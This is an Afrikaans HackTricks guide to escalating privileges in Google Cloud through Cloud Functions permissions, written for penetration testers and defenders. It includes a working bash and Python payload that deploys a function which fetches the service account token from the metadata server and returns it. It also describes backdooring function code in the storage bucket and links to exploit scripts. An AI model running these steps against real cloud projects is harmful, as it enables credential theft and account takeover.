# GCP - Cloudfunctions Privesc

{{#include ../../../banners/hacktricks-training.md}}

## cloudfunctions

Meer inligting oor Cloud Functions:

{{#ref}}
../gcp-services/gcp-cloud-functions-enum.md
{{#endref}}

### `cloudfunctions.functions.create` , `cloudfunctions.functions.sourceCodeSet`_,_ `iam.serviceAccounts.actAs`

'n aanvaller met hierdie privileges kan **'n nuwe Cloud Function skep met arbitrêre (malicious) kode en dit 'n Service Account toewys**. Daarna, leak die Service Account token vanaf die metadata om privileges daarop op te skaal.\
Sommige privileges om die funksie te trigger mag vereis word.

Exploit scripts vir hierdie metode kan gevind word [here](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-call.py) en [here](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-setIamPolicy.py) en die voorafgeboude .zip lêer kan gevind word [here](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/tree/master/ExploitScripts/CloudFunctions).

### `cloudfunctions.functions.update` , `cloudfunctions.functions.sourceCodeSet`_,_ `iam.serviceAccounts.actAs`

'n aanvaller met hierdie privileges kan **die kode van 'n Function wysig en selfs die aangehegte service account wysig** met die doel om die token te exfiltrate.

> [!CAUTION]
> Om Cloud Functions te deploy sal jy ook actAs-permissies nodig hê op die default compute service account of op die service account wat gebruik word om die image te bou.

Sommige ekstra privileges soos die `.call` permission vir version 1 cloudfunctions of die rol `role/run.invoker` om die funksie te trigger mag vereis wees.

<details><summary>Werk Cloud Function by met kwaadwillige kode om die service account token te exfiltrate</summary>
```bash
# Create new code
temp_dir=$(mktemp -d)

cat > $temp_dir/main.py <<EOF
import subprocess

def main(request):
cmd = "curl -s -f -H 'Metadata-Flavor: Google' 'http://metadata/computeMetadata/v1/instance/service-accounts/default/token'"
result = subprocess.check_output(cmd, shell=True, text=True)
return result
EOF

echo "" > $temp_dir/requirements.txt

zip -r $temp_dir/function.zip $temp_dir/main.py $temp_dir/requirements.txt

# Update code
gcloud functions deploy <cloudfunction-name> \
--runtime python312 \
--source $temp_dir \
--entry-point main \
--service-account <sa>@$PROJECT_ID.iam.gserviceaccount.com \
--trigger-http \
--allow-unauthenticated

# Get SA token calling the new function code
gcloud functions call <cloudfunction-name>
```
</details>

> [!CAUTION]
> As jy die fout `Permission 'run.services.setIamPolicy' denied on resource...` kry, is dit omdat jy die `--allow-unauthenticated` param gebruik en jy nie genoeg permissies daarvoor het nie.

Die exploit script vir hierdie metode kan gevind word [here](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.update.py).

### `cloudfunctions.functions.sourceCodeSet`

Met hierdie toestemming kan jy 'n **signed URL kry om 'n lêer na 'n function bucket op te laai (maar die kode van die function sal nie verander word nie, jy moet dit steeds bywerk)**

<details><summary>Generate signed upload URL for Cloud Function</summary>
```bash
# Generate the URL
curl -X POST https://cloudfunctions.googleapis.com/v2/projects/{project-id}/locations/{location}/functions:generateUploadUrl \
-H "Authorization: Bearer $(gcloud auth application-default print-access-token)" \
-H "Content-Type: application/json" \
-d '{}'
```
</details>

Nie regtig seker hoe nuttig net hierdie toestemming vanuit 'n aanvaller's perspektief is nie, maar goed om te weet.

### `cloudfunctions.functions.setIamPolicy` , `iam.serviceAccounts.actAs`

Gee jouself enige van die vorige **`.update`** of **`.create`** voorregte om te eskaleer.

### `cloudfunctions.functions.update`

As jy slegs **`cloudfunctions`**-toestemmings het, sonder **`iam.serviceAccounts.actAs`**, sal jy nie die funksie kan opdateer nie, SO THIS IS NOT A VALID PRIVESC.

### Read & Write Access over the bucket

As jy lees- en skryftoegang tot die bucket het, kan jy veranderinge in die kode monitor en wanneer 'n **update in die bucket plaasvind, kan jy die nuwe kode vervang met jou eie kode** sodat die nuwe weergawe van die Cloud Function met die ingesmokkelde backdoored code uitgevoer sal word.

Jy kan meer oor die aanval sien in:

{{#ref}}
gcp-storage-privesc.md
{{#endref}}

Jy kan dit egter nie gebruik om derdeparty Cloud Functions vooraf te kompromitteer nie, want as jy die bucket in jou rekening skep en dit publieke toestemmings gee sodat die eksterne projek daaroor kan skryf, kry jy die volgende fout:

<figure><img src="../../../images/image (1) (1) (1).png" alt="" width="304"><figcaption></figcaption></figure>

> [!CAUTION]
> Daarteen, dit kan egter gebruik word vir DoS attacks.

### Read & Write Access over Artifact Registry

Wanneer 'n Cloud Function geskep word, word 'n nuwe docker image na die Artifact Registry van die projek gepush. Ek het probeer om die image te vervang met 'n nuwe een, en selfs die huidige image (en die `cache` image) te verwyder, maar niks het verander nie — die Cloud Function het voortgegaan om te werk. Daarom mag dit moontlik wees om 'n Race Condition attack te misbruik, soos met die bucket, om die docker container wat uitgevoer sal word te verander, maar net die gestoor image aan te pas is nie genoeg om die Cloud Function te kompromitteer nie.

## Verwysings

- [https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)

{{#include ../../../banners/hacktricks-training.md}}
